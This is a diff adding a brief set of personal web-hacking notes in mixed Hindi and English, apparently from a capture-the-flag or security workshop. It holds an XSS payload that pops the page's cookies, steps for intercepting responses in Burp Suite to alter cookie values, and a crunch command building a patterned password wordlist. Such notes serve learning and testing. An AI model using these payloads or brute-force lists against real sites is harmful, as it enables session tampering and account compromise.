@@ -1,0 +1,10 @@
+Alert script to pop cokkies value 
+
+<script>alert(document.cookie)</script>
+
+agar post method rhe toh 
+burp suite me intercept krke
+cookie ko change krna hai (Do interscept --> Resonse to intercept --> Change cookie value --> forward ) 
+
+
+crunch 25 25 -t “NullBhubaneswarHumla@@@” -o Desktop/passlsit.txt
